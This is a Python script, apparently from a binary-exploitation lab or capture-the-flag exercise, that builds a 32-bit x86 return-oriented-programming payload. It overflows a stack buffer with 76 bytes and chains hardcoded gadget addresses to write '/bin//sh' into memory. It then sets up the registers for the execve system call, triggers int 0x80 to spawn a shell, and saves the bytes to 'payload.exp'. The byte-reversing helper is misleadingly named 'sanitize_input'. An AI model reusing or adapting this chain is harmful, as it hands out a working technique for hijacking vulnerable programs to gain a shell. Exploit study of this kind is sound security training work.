def sanitize_input(exploit_str):
	exploit_str_b = bytes.fromhex(exploit_str)
	exploit_str_split = [exploit_str_b[i:i + 1] for i in range(0, len(exploit_str_b), 1)]
	exploit_str_split.reverse()
	sanitize_exploit_str = b"".join(exploit_str_split) + b""
	return sanitize_exploit_str




####################### STEP 1 : Corrupt loop iterator and overflow till frame pointer in stack #######################
step_0=b"S"*76
# step_0 = corrupt_loop_iterator



####################### STEP 1 : Load "/bin//////sh\0" string in memory #######################
# pop edx ; ret
# 0x80b2c62(0x080e62e0)
step_1 = sanitize_input("080b2c62") + sanitize_input("080e62e0")
# pop eax ; ret
# 0x8091a64('/bin')
step_1 = step_1 + sanitize_input("08091a64") + b"/bin"
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_1 = step_1 + sanitize_input("08059052")

# pop edx ; ret
# 0x80b2c62(0x080e62e4)
step_1 = step_1 + sanitize_input("080b2c62") + sanitize_input("080e62e4")
# pop eax ; ret
# 0x8091a64('/bin')
step_1 = step_1 + sanitize_input("08091a64") + b"////"
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_1 = step_1 + sanitize_input("08059052")

# pop edx ; ret
# 0x80b2c62(0x080e62e8)
step_1 = step_1 + sanitize_input("080b2c62") + sanitize_input("080e62e8")
# pop eax ; ret
# 0x8091a64('/bin')
step_1 = step_1 + sanitize_input("08091a64") + b"//sh"
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_1 = step_1 + sanitize_input("08059052")


# pop edx ; ret
# 0x80b2c62(0x080e62ec)
step_1 = step_1 + sanitize_input("080b2c62") + sanitize_input("080e62ec")
# xor eax, eax ; ret
# 0x0804fb80
step_1 = step_1 + sanitize_input("0804fb80")
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_1 = step_1 + sanitize_input("08059052")




####################### STEP 2 : Load array [&("/bin//sh"), 0] #######################

# pop edx ; ret
# 0x80b2c62(0x080e6360)
step_2 = sanitize_input("080b2c62") + sanitize_input("080e6360")
# pop eax ; ret
# 0x8091a64(0x080e62e0)
step_2 = step_2 + sanitize_input("08091a64") + sanitize_input("080e62e0")
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_2 = step_2 + sanitize_input("08059052")


# pop edx ; ret
# 0x80b2c62(0x080e6364)
step_2 = step_2 + sanitize_input("080b2c62") + sanitize_input("080e6364")
# xor eax, eax ; ret
# 0x0804fb80
step_2 = step_2 + sanitize_input("0804fb80")
# mov dword ptr [edx], eax ; ret
# 0x08059052
step_2 = step_2 + sanitize_input("08059052")


####################### STEP 3 : Setting registers: eax, ebx, ecx, edx #######################

# mov edx, 0xffffffff ; ret
# 0x080584b9
# inc edx ; ret
# 0x0805f8b4 
step_3 = sanitize_input("080584b9") + sanitize_input("0805f8b4")

# pop eax ; ret
# 0x8091a64(0x080e6360)
step_3 = step_3 + sanitize_input("08091a64") + sanitize_input("080e6360")
# mov ecx, eax ; mov eax, ecx ; ret
# 0x80936a8
step_3 = step_3 + sanitize_input("080936a8")

# pop ebx ; ret
# 0x8049022(0x080e62e0)
step_3 = step_3 + sanitize_input("08049022") + sanitize_input("080e62e0")

# xor eax, eax ; ret
# 0x0804fb80
zero_eax = sanitize_input("0804fb80")
# 0x08080e9e
# inc eax ; ret
inc_eax = sanitize_input("08080e9e")
syscall_num = 11
step_3_4 = zero_eax + b"".join([inc_eax]*syscall_num)

step_3 = step_3 + step_3_4



####################### STEP 4 : Invoking System Call #######################
# 0x0804a3c2
# int 0x80
step_4 = sanitize_input("0804a3c2")




# Final payload
payload = step_0 + step_1 + step_2  + step_3 + step_4
exp_file_name = "payload.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()

